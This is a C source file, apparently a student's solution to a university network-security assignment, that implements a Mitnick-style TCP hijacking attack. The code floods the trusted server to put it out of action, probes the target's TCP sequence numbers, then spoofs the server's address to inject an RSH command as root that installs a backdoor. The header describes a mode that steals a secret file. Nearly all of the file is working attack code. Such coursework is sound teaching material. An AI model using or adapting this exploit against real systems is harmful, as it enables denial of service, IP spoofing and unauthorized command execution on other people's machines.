/* EXPLOIT.c
 *   by DukeD1rtfarm3r
 *
 * Created:
 *   10/09/2020, 15:27:09
 * Last edited:
 *   21/09/2020, 15:42:21
 * Auto updated?
 *   Yes
 *
 * Description:
 *   This file is the entry point for the exploit of assignment 2 of the
 *   course Computer and Network Security.
 * 
 *   The Mitnick-Attack works in the following way by exploiting a trust
 *   relationship between a terminal and a server. First, we will DoS the
 *   server so it will not bother subsequent communication between us and the
 *   terminal. Then, we will send many TCP-handshakes with the xterminal to
 *   (hopefully) determine a fault in its TCP sequence number generation, which
 *   we can use to predict those. Finally, we inject a backdoor in the
 *   xterminal using said broken sequence number prediction.
 * 
 *   Note that this program supports three operating modes:
 *     - Smash 'n' grab (--smashgrab): Runs the exploit, steals the secret.txt
 *       and cleans up again (including removal of said backdoor)
 *     - Exploit (--exploit): Only exploit the server, but do not cleanup yet
 *     - Cleanup (--cleanup): Cleanup an exploited server.
 * 
 *   Useful sources:
 *     - http://books.gigatux.nl/mirror/networksecuritytools/0596007949/networkst-CHP-11-SECT-2.html#networkst-CHP-11-TABLE-1
 *     - http://books.gigatux.nl/mirror/networksecuritytools/0596007949/networkst-CHP-11-SECT-4.html
 *     - https://fossies.org/dox/libnet-libnet-1.2/libnet-functions_8h.html
 *     - https://www.devdungeon.com/content/using-libpcap-c
 *     - https://www.tcpdump.org/manpages/
 *     - https://www.tcpdump.org/pcap.html
 *     - https://nxmnpg.lemoda.net/8/rshd
 * 
 *   RSH TODO:
 *     - First, send a "0" string to signify we don't want a stderr connection
 *     - Then, we send up to 16 characters of CLIENT username (which can be fake lol)
 *     - Next, we send up to 16 characters of REMOTE username (which should be a match, I imagine -> try 'root')
 *     - Finally, we will simply send the command as a null-terminated string
 *     - If we receive a null-char, we're done (but we won't lol)
 * 
 *  NOTES:
 *     - Possibly increase ACK number by 1 when sending the RSH injection to make things work
 *     - Also, perhaps delay after SYN and data send to avoid flooding the xterminal
 * 
**/

typedef unsigned int uint;
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <libnet.h>
#include <pcap.h>
#include <time.h>

#include "tools.h"
#include "globals.h"
#include "networking.h"


/***** HELPER FUNCTIONS *****/
/* Prints a neat help message. */
void print_help(char* executable) {
    printf("Usage: %s -x XTERM_IP -s SERVER_IP -i INTERFACE\n", executable);
    printf("\n-h, --help\t\tShows this help message.\n");
    printf("\n-I, --server-ip\t\tSets the server IPv4-address that we want to use for the attack (DEFAULT: %u.%u.%u.%u).\n",
           IP_FORMAT(DEFAULT_SERVER_ADDR));
    printf("\n-P, --server-port\t\tSets the server port that we want to use for the attack (DEFAULT: %u).\n",
           DEFAULT_SERVER_PORT);
    printf("\n-i, --xterm-ip\t\tSets the xterminal IPv4-address that we want to use for the attack (DEFAULT: %u.%u.%u.%u).\n",
           IP_FORMAT(DEFAULT_XTERM_ADDR));
    printf("\n-p, --xterm-port\t\tSets the xterminal port that we want to use for the attack (DEFAULT: %u).\n",
           DEFAULT_RSH_PORT);
    printf("\n-d, --device\t\tSets the interface we want to use (DEFAULT: '%s').\n",
           DEFAULT_INTERFACE);
    printf("\n-l, --local-user\t\tSets the local user we want to pretend to be during the RSH injection (DEFAULT: '%s').\n",
           DEFAULT_LOCAL_USER);
    printf("\n-x, --xterm-user\t\tSets the remote Xterminal user we want to pretend to be during the RSH injection (DEFAULT: '%s').\n",
           DEFAULT_XTERM_USER);
    printf("\n-c, --command\t\tThe command to inject in the remote Xterminal. (DEFAULT: '%s').\n",
           DEFAULT_XTERM_USER);
    printf("\n");
}

/* Parses the commandline arguments. Returns 0 on success, or an error code if something went wrong. */
int parse_cli(uint32_t* server_ip, uint16_t* server_port, uint32_t* xterm_ip, uint16_t* xterm_port, char* interface, char* local_user, char* xterm_user, char* to_inject, int argc, char** argv) {
    for (int i = 1; i < argc; i++) {
        char* arg = argv[i];
        if (arg[0] == '-') {
            // Either single-label or multi-label
            if ((arg[1] == 'h' && arg[2] == '\0') || streq(arg + 1, "-help")) {
                // Print the help message, then quit
                print_help(argv[0]);
                return -2;
            } else if ((arg[1] == 'I' && arg[2] == '\0') || streq(arg + 1, "-server-ip")) {
                // spoofed ip, so parse the next argument as an ip
                if (i == argc - 1) {
                    fprintf(stderr, "[ERROR] Missing value for '%s'.\n", arg);
                    return -1;
                }
                if (!str_to_ip(server_ip, argv[i + 1])) { return EXIT_FAILURE; }
            } else if ((arg[1] == 'P' && arg[2] == '\0') || streq(arg + 1, "-server-port")) {
                // spoofed port, so parse the next argument as an 16-bit unsigned integer
                if (i == argc - 1) {
                    fprintf(stderr, "[ERROR] Missing value for '%s'.\n", arg);
                    return -1;
                }
                if (!str_to_uint16(server_port, argv[i + 1])) {
                    fprintf(stderr, "[ERROR] Could not parse '%s' as a 16-bit port number.\n", argv[i + 1]);
                    return EXIT_FAILURE;
                }
            } else if ((arg[1] == 'i' && arg[2] == '\0') || streq(arg + 1, "-xterm-ip")) {
                // xterm ip, so parse the next argument as an ip
                if (i == argc - 1) {
                    fprintf(stderr, "[ERROR] Missing value for '%s'.\n", arg);
                    return -1;
                }
                if (!str_to_ip(xterm_ip, argv[i + 1])) { return EXIT_FAILURE; }
            } else if ((arg[1] == 'p' && arg[2] == '\0') || streq(arg + 1, "-xterm-port")) {
                // target port, so parse the next argument as an 16-bit unsigned integer
                if (i == argc - 1) {
                    fprintf(stderr, "[ERROR] Missing value for '%s'.\n", arg);
                    return -1;
                }
                if (!str_to_uint16(xterm_port, argv[i + 1])) {
                    fprintf(stderr, "[ERROR] Could not parse '%s' as a 16-bit port number.\n", argv[i + 1]);
                    return EXIT_FAILURE;
                }
            } else if ((arg[1] == 'd' && arg[2] == '\0') || streq(arg + 1, "-device")) {
                // used interface, so parse as string
                if (i == argc - 1) {
                    fprintf(stderr, "[ERROR] Missing value for '%s'.\n", arg);
                    return -1;
                }
                if (strlen(argv[i + 1]) >= MAX_INTERFACE_SIZE) {
                    fprintf(stderr, "[ERROR] Device name '%s' too long.\n", argv[i + 1]);
                    return -1;
                }
                strcpy(interface, argv[i + 1]);
            } else if ((arg[1] == 'l' && arg[2] == '\0') || streq(arg + 1, "-local-user")) {
                // local user name, so parse as string
                if (i == argc - 1) {
                    fprintf(stderr, "[ERROR] Missing value for '%s'.\n", arg);
                    return -1;
                }
                if (strlen(argv[i + 1]) >= 16) {
                    fprintf(stderr, "[ERROR] Local username '%s' too long.\n", argv[i + 1]);
                    return -1;
                }
                strcpy(local_user, argv[i + 1]);
            } else if ((arg[1] == 'x' && arg[2] == '\0') || streq(arg + 1, "-xterm-user")) {
                // xterm user name, so parse as string
                if (i == argc - 1) {
                    fprintf(stderr, "[ERROR] Missing value for '%s'.\n", arg);
                    return -1;
                }
                if (strlen(argv[i + 1]) >= 16) {
                    fprintf(stderr, "[ERROR] Xterminal username '%s' too long.\n", argv[i + 1]);
                    return -1;
                }
                strcpy(xterm_user, argv[i + 1]);
            } else if ((arg[1] == 'c' && arg[2] == '\0') || streq(arg + 1, "-command")) {
                // the command to inject, so parse as string
                if (i == argc - 1) {
                    fprintf(stderr, "[ERROR] Missing value for '%s'.\n", arg);
                    return -1;
                }
                if (strlen(argv[i + 1]) >= MAX_COMMAND_LENGTH) {
                    fprintf(stderr, "[ERROR] To-be-injected command '%s' too long.\n", argv[i + 1]);
                    return -1;
                }
                strcpy(to_inject, argv[i + 1]);
            } else {
                fprintf(stderr, "[ERROR] Unknown option '%s' (see '--help' for a complete list).\n", arg);
                return -1;
            }
        }
    }

    // Done
    return 0;

}

/* Waits for the specified number of milliseconds. */
void sleep_ms(int ms) {
    // See: https://stackoverflow.com/questions/1157209/is-there-an-alternative-sleep-function-in-c-to-milliseconds (caf's answer)
    int result;
    struct timespec wait;
    wait.tv_sec = ms / 1000;
    wait.tv_nsec = (ms % 1000) * 1000000;
    do {
        result = nanosleep(&wait, &wait);
    } while (result == -1 && errno == EINTR);
}



/***** ENTRY POINT *****/
int main(int argc, char** argv) {
    /* Parse the command line args. */
    // Declare the space to hold the values
    uint32_t server_ip = DEFAULT_SERVER_ADDR;
    uint16_t server_port = DEFAULT_SERVER_PORT;
    uint32_t xterm_ip = DEFAULT_XTERM_ADDR;
    uint16_t xterm_port = DEFAULT_RSH_PORT;
    char interface[MAX_INTERFACE_SIZE];
    char local_user[16];
    char xterm_user[16];
    char to_inject[MAX_COMMAND_LENGTH];
    // Set the defaults for the strings
    strcpy(interface, DEFAULT_INTERFACE);
    strcpy(local_user, DEFAULT_LOCAL_USER);
    strcpy(xterm_user, DEFAULT_XTERM_USER);
    strcpy(to_inject, DEFAULT_TO_INJECT);

    // Parse the CLI
    int result = parse_cli(&server_ip, &server_port, &xterm_ip, &xterm_port, interface, local_user, xterm_user, to_inject, argc, argv);
    if (result == -2) { return EXIT_SUCCESS; }
    else if (result != 0) { return result; }



    /* Print a neat header message. */
    printf("\n*** KEVIN MITNICK SIMULATOR 2020 ***\n\n");

    // Print the options used
    printf("Using options:\n");
    printf(" - Server IP      : %u.%u.%u.%u\n", IP_FORMAT(server_ip));
    printf(" - Server port    : %u\n", server_port);
    printf(" - Xterminal IP   : %u.%u.%u.%u\n", IP_FORMAT(xterm_ip));
    printf(" - Xterminal port : %u\n", xterm_port);
    printf(" - Interface      : '%s'\n", interface);
    printf(" - Local user     : '%s'\n", local_user);
    printf(" - Xterm user     : '%s'\n", xterm_user);
    printf(" - RSH command    : '%s'\n", to_inject);
    printf("\n");
    fflush(stdout);



    /* Prepare exploitation by opening an interface. */
    printf("Initializing libnet on interface '%s'...\n", interface);
    // Initialize the error message buffer, which is used for both libnet and pcap
    char errbuf[LIBNET_ERRBUF_SIZE > PCAP_ERRBUF_SIZE ? LIBNET_ERRBUF_SIZE : PCAP_ERRBUF_SIZE];

    // Open a raw IP4 socket
    libnet_t* l = libnet_init(LIBNET_RAW4, interface, errbuf);
    if (l == NULL) {
        fprintf(stderr, "[ERROR] Could not initialize libnet: %s\n\n", errbuf);
        return EXIT_FAILURE;
    }

    // Set the random seed appropriately
    if (libnet_seed_prand(l) == -1) {
        fprintf(stderr, "[ERROR] Could not seed the random number generator of libnet.\n");
        return EXIT_FAILURE;
    }



    /* Initialize a pcap interface. */
    printf("Initializing pcap on interface '%s'...\n", interface);
    pcap_t* p = pcap_open_live(interface, BUFSIZ, 1, DOS_VERIFY_TIMEOUT, errbuf);
    if (p == NULL) {
        libnet_destroy(l);
        fprintf(stderr, "[ERROR] Failed to open device '%s' for packet capture: %s\n", interface, errbuf);
        return -1;
    }



    /* Run the DoS on the server. */
    // First, create the TCP-SYN packet we'll send
    result = create_tcp_pkt(
        NULL, NULL,
        l, TH_SYN,
        xterm_ip, libnet_get_prand(LIBNET_PRu16),
        server_ip, server_port,
        libnet_get_prand(LIBNET_PRu32), libnet_get_prand(LIBNET_PRu32),
        (const uint8_t*) "disable", 7
    );
    if (result != 0) {
        return result;
    }

    // Then, we run the exploit
    printf("Running DoS-attack on server...\n");
    for (int i = 1; i <= MAX_DOS_TRIES; i++) {
        // Send the DoS-attack packets
        for (int i = 0; i < 10; i++) {
            if (libnet_write(l) == -1) {
                fprintf(stderr, "[ERROR] Could not send DoS-attack packet %d/10: %s\n", i, libnet_geterror(l));
                return EXIT_FAILURE;
            }
        }

        // Then, we check if we were succesful
        printf("Checking if server is down..."); fflush(stdout);
        result = server_check_status(l, p, server_ip, server_port);
        if (result == 1) {
            // Succes! Time to run the next part
            printf(" SUCCES\n");
            break;
        } else if (result == 0) {
            // DoS doesn't seem to have worked...
            printf(" FAIL\nRetrying DoS (%d/%d)...", i + 1, MAX_DOS_TRIES);
        } else {
            // Error occured
            libnet_destroy(l);
            pcap_close(p);
            return result;
        }
    }



    /* Next up: probe the remote xterm twice to find out the difference in sequence numbers. */
    printf("Probing Xterminal to find SEQ difference...\n");
    uint32_t results[2];
    result = probe_tcp_seq(
        results,
        l, p,
        libnet_get_ipaddr4(l), libnet_get_prand(LIBNET_PRu16),
        xterm_ip, xterm_port,
        2
    );
    if (result != 0) { return -1; }

    uint32_t dack = results[1] - results[0];
    printf(" > Found difference: %u\n", dack);



    /* Before we inject, create the bytes for the RSH command. */
    printf("Constructing RSH command...\n");
    uint8_t rsh_command[2 + 16 + 16 + MAX_COMMAND_LENGTH];
    uint32_t rsh_size = 0;

    // First, put the client username there
    strcpy((char*) (rsh_command + rsh_size), local_user);
    rsh_size += strlen(local_user) + 1;

    // Next up, the remote Xterminal username
    strcpy((char*) (rsh_command + rsh_size), xterm_user);
    rsh_size += strlen(xterm_user) + 1;

    // Finally, copy the command to the buffer
    strcpy((char*) (rsh_command + rsh_size), to_inject);
    rsh_size += strlen(to_inject) + 1;



    /* Now, establish a TCP connection with the Xterminal, and send the desired command using RSH's protocol in the payload of the third (and final) handshake-packet. */
    printf("Injecting RSH command...\n");

    // Be sure to reset the libnet socket
    libnet_clear_packet(l);

    // Construct the TCP-SYN packet
    uint32_t seq = libnet_get_prand(LIBNET_PRu32);
    uint32_t ack = results[1];
    libnet_ptag_t tcp = 0;
    libnet_ptag_t ipv4 = 0;
    result = create_tcp_pkt(
        &tcp, &ipv4,
        l, TH_SYN,
        server_ip, server_port,
        xterm_ip, xterm_port,
        seq, 0,
        NULL, 0
    );
    if (result != 0) { return result; }

    // Send it to the xterm
    if (libnet_write(l) == -1) {
        fprintf(stderr, "[ERROR] Could not send TCP-SYN packet to start the RSH connection: %s\n", libnet_geterror(l));
        return EXIT_FAILURE;
    }

    // Bit o' waiting (1ms) to avoid flooding the xterminal
    sleep_ms(1);

    // Then, construct the TCP packet which completes the handshake
    dack += XTERM_SEQ_INCREASE;
    ack += dack + 1;
    ++seq;
    result = create_tcp_pkt(
        &tcp, &ipv4,
        l, TH_ACK,
        server_ip, server_port,
        xterm_ip, xterm_port,
        seq, ack,
        NULL, 0
    );
    if (result != 0) { return result; }

    // Send it to the xterm
    if (libnet_write(l) == -1) {
        fprintf(stderr, "[ERROR] Could not send the third TCP handshake packet data packet: %s\n", libnet_geterror(l));
        return EXIT_FAILURE;
    }

    // Bit o' waiting (1ms) to avoid flooding the xterminal
    sleep_ms(1);

    // Then, construct the TCP packet carrying the initial stderr-port
    result = create_tcp_pkt(
        &tcp, &ipv4,
        l, TH_ACK | TH_PUSH,
        server_ip, server_port,
        xterm_ip, xterm_port,
        seq, ack,
        (uint8_t*) "0", 2
    );
    if (result != 0) { return result; }

    // Send it to the xterm
    if (libnet_write(l) == -1) {
        fprintf(stderr, "[ERROR] Could not send the RSH stderr port data packet: %s\n", libnet_geterror(l));
        return EXIT_FAILURE;
    }

    // Bit o' waiting (1ms) to avoid flooding the xterminal
    sleep_ms(1);

    // Then, create the TCP packet that will send the actual command (including usernames)
    seq += 2;
    result = create_tcp_pkt(
        &tcp, &ipv4,
        l, TH_ACK | TH_PUSH,
        server_ip, server_port,
        xterm_ip, xterm_port,
        seq, ack,
        rsh_command, rsh_size
    );
    if (result != 0) { return result; }

    // Send it to the xterm
    if (libnet_write(l) == -1) {
        fprintf(stderr, "[ERROR] Could not send the RSH command data packet: %s\n", libnet_geterror(l));
        return EXIT_FAILURE;
    }

    // Bit o' waiting (3ms) to give the server the time to process the command and send a TCP-FIN
    sleep_ms(3);

    // Reply to the Xterminal's FIN-packet by simply sending an ACK one
    dack += XTERM_SEQ_INCREASE;
    ack += dack + 1;
    ++seq;
    result = create_tcp_pkt(
        &tcp, &ipv4,
        l, TH_ACK,
        server_ip, server_port,
        xterm_ip, xterm_port,
        seq, ack,
        NULL, 0
    );
    if (result != 0) { return result; }

    // Send it to the xterm
    if (libnet_write(l) == -1) {
        fprintf(stderr, "[ERROR] Could not send the TCP-FIN reply packet: %s\n", libnet_geterror(l));
        return EXIT_FAILURE;
    }

    // Finally, do close with a TCP-FIN of our own
    seq += rsh_size;
    result = create_tcp_pkt(
        &tcp, &ipv4,
        l, TH_ACK | TH_FIN,
        server_ip, server_port,
        xterm_ip, xterm_port,
        seq, ack,
        NULL, 0
    );
    if (result != 0) { return result; }

    // Send it to the xterm
    if (libnet_write(l) == -1) {
        fprintf(stderr, "[ERROR] Could not send the TCP-FIN packet to close the RSH connection: %s\n", libnet_geterror(l));
        return EXIT_FAILURE;
    }
    printf("Injection complete.\n");



    /* Once that's done, re-enable the server. */
    printf("Re-enabling server...\n");
    // Prepare a TCP packet on the wire
    result = create_tcp_pkt(
        &tcp, &ipv4,
        l, TH_SYN,
        xterm_ip, xterm_port,
        server_ip, server_port,
        libnet_get_prand(LIBNET_PRu32), libnet_get_prand(LIBNET_PRu32),
        (const uint8_t*) "enable", 6
    );
    if (result != 0) {
        return result;
    }

    // Send the packet on its way
    if (libnet_write(l) == -1) {
        fprintf(stderr, "[ERROR] Could not send server-enable packet: %s\n", libnet_geterror(l));
        return EXIT_FAILURE;
    }



    /* Cleanup. */
    libnet_destroy(l);
    pcap_close(p);
    printf("\nDone.\n\n");

    return EXIT_SUCCESS;
}
